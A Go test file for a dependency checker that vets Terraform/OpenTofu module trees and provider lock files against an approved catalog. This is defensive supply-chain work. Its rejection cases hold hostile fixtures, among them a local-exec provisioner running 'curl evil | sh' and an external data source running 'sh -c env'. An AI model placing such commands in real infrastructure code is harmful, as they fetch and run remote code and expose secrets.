package depcheck

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/itsPavanFeed/cloud-pravaha-backend/internal/catalog"
)

func cat(t *testing.T) *catalog.Catalog {
	c, err := catalog.New([]*catalog.Module{
		{ID: "sa", Source: "Azure/avm-res-storage-storageaccount/azurerm", Versions: []string{"0.10.0"}, Providers: []string{"hashicorp/random"},
			Dependencies: []catalog.Dependency{{Source: "Azure/avm-utl-interfaces/azure", Versions: []string{"0.6.0"}}}},
	}, []catalog.Provider{{Source: "hashicorp/random", Version: "3.9.1"}})
	if err != nil {
		t.Fatal(err)
	}
	return c
}

type mod struct{ key, source, version, dir, code string }

func workdir(t *testing.T, mods []mod, lock string) string {
	t.Helper()
	root := t.TempDir()
	var entries []string
	entries = append(entries, `{"Key":"","Source":"","Dir":"."}`)
	for _, m := range mods {
		d := filepath.Join(root, m.dir)
		os.MkdirAll(d, 0o755)
		os.WriteFile(filepath.Join(d, "main.tf"), []byte(m.code), 0o644)
		entries = append(entries, `{"Key":"`+m.key+`","Source":"`+m.source+`","Version":"`+m.version+`","Dir":"`+m.dir+`"}`)
	}
	os.MkdirAll(filepath.Join(root, ".terraform", "modules"), 0o755)
	os.WriteFile(filepath.Join(root, ".terraform", "modules", "modules.json"), []byte(`{"Modules":[`+strings.Join(entries, ",")+`]}`), 0o644)
	os.WriteFile(filepath.Join(root, ".terraform.lock.hcl"), []byte(lock), 0o644)
	return root
}

const goodLock = `provider "registry.opentofu.org/hashicorp/random" {
  version     = "3.9.1"
  constraints = ">= 3.5.0"
  hashes = ["h1:x"]
}
`

func base() []mod {
	return []mod{
		{"sa", "registry.opentofu.org/Azure/avm-res-storage-storageaccount/azurerm", "0.10.0", ".terraform/modules/sa", `resource "random_uuid" "x" {}`},
		{"sa.containers", "./modules/container", "", ".terraform/modules/sa/modules/container", `resource "random_uuid" "y" {}`},
		{"sa.containers.ra", "../role_assignments", "", ".terraform/modules/sa/modules/role_assignments", `# provisioner "local-exec" in a comment is fine`},
		{"sa.containers.ra.interfaces", "registry.opentofu.org/Azure/avm-utl-interfaces/azure", "0.6.0", ".terraform/modules/sa.containers.ra.interfaces", `locals {}`},
	}
}

func TestApprovedTreePasses(t *testing.T) {
	if err := Check(workdir(t, base(), goodLock), cat(t)); err != nil {
		t.Fatal(err)
	}
}

func TestRejects(t *testing.T) {
	cases := map[string]func([]mod, string) ([]mod, string){
		"git nested module": func(m []mod, l string) ([]mod, string) {
			return append(m, mod{"sa.evil", "git::https://github.com/evil/mod.git", "", ".terraform/modules/sa.evil", ""}), l
		},
		"unapproved nested registry module": func(m []mod, l string) ([]mod, string) {
			return append(m, mod{"sa.x", "registry.opentofu.org/evil/backdoor/aws", "1.0.0", ".terraform/modules/sa.x", ""}), l
		},
		"unapproved nested version": func(m []mod, l string) ([]mod, string) {
			m[3].version = "0.5.0"
			return m, l
		},
		"other registry": func(m []mod, l string) ([]mod, string) {
			m[0].source = "registry.terraform.io/Azure/avm-res-storage-storageaccount/azurerm"
			return m, l
		},
		"local-exec provisioner": func(m []mod, l string) ([]mod, string) {
			m[1].code = "resource \"terraform_data\" \"x\" {\n  provisioner \"local-exec\" {\n    command = \"curl evil | sh\"\n  }\n}"
			return m, l
		},
		"external data source": func(m []mod, l string) ([]mod, string) {
			m[2].code = `data "external" "x" { program = ["sh", "-c", "env"] }`
			return m, l
		},
		"local path escaping package": func(m []mod, l string) ([]mod, string) {
			return append(m, mod{"sa.esc", "../../../../outside", "", ".terraform/modules/elsewhere", ""}), l
		},
		"unlisted provider": func(m []mod, l string) ([]mod, string) {
			return m, l + "provider \"registry.opentofu.org/hashicorp/external\" {\n  version = \"2.3.0\"\n}\n"
		},
		"provider version drift": func(m []mod, l string) ([]mod, string) {
			return m, strings.Replace(l, "3.9.1", "3.9.0", 1)
		},
		"provider from another registry": func(m []mod, l string) ([]mod, string) {
			return m, strings.Replace(l, "registry.opentofu.org", "evil.example.com", 1)
		},
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			m, l := mutate(base(), goodLock)
			if err := Check(workdir(t, m, l), cat(t)); err == nil {
				t.Fatal("expected rejection")
			}
		})
	}
}

func TestExamplesDirectoryIsNotScanned(t *testing.T) {
	m := base()
	dir := workdir(t, m, goodLock)
	ex := filepath.Join(dir, ".terraform/modules/sa/examples/x")
	os.MkdirAll(ex, 0o755)
	os.WriteFile(filepath.Join(ex, "main.tf"), []byte(`provisioner "local-exec" {}`), 0o644)
	if err := Check(dir, cat(t)); err != nil {
		t.Fatalf("examples are never loaded and must not fail the check: %v", err)
	}
}
